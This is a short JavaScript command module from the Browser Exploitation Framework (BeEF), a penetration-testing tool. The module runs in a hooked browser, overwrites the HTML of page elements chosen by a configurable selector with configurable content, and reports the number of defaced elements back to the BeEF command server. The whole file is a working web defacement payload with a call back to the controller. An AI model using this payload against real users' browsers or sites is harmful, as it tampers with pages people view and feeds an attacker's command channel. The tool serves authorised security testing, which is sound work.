//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = $j('<%= @deface_selector %>').each(function() {
		$j(this).html('<%= @deface_content %>');
	}).length;

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Defaced "+ result +" elements");
});
